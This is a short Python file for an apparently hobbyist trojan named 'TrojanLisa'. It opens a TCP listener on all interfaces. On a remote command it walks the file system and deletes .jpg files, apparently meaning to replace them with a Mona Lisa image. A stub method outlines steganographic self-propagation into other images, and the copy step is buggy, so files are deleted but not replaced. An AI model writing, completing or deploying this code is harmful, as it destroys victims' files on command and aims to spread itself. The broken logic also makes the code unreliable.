import os
import shutil
import socket

class TrojanLisa:
    def __init__(self):
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    """ Server that opens a TCP socket. """
    def host(self, ip_addr, port):
        self.serv.bind((ip_addr, port))
        self.serv.listen()
        while True:
            conn, addr = self.serv.accept()
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    resp = data.decode()
                    print(resp)
                    self.execute(resp)
                    message = "Message from server"
                    conn.send(message.encode())
                except:
                    break
            conn.close()
            print("Client disconnected")

    def execute(self, command):
        if command == "1":
            print("Replacing images with Mona Lisa...")
            self.enumerate_fs()

    """ Steganographic executable propagation into other images. """
    def propagate(self):
        # TODO: Write excutable propagation
        pass

    """ Enumerate through file system and list all jpg files. """
    def enumerate_fs(self):
        # TODO: Change filetype to image that allows executable embeddings
        rootdir = "." + os.sep
        rootlisa = ".." + os.sep + "img" + os.sep + "mona_lisa.jpg"
        print(rootdir, rootlisa)
        for subdir, dirs, files in os.walk(rootdir):
            for file in files:
                filepath = subdir + os.sep + file

                if filepath.endswith(".jpg"):
                    print("Overwriting...", filepath)
                    test = os.path.join(rootdir, file)
                    print(test)
                    os.remove(test)
                    shutil.copy(test, rootlisa)
            
if __name__=="__main__":
    trojan_lisa = TrojanLisa()
    trojan_lisa.host('0.0.0.0', 8080)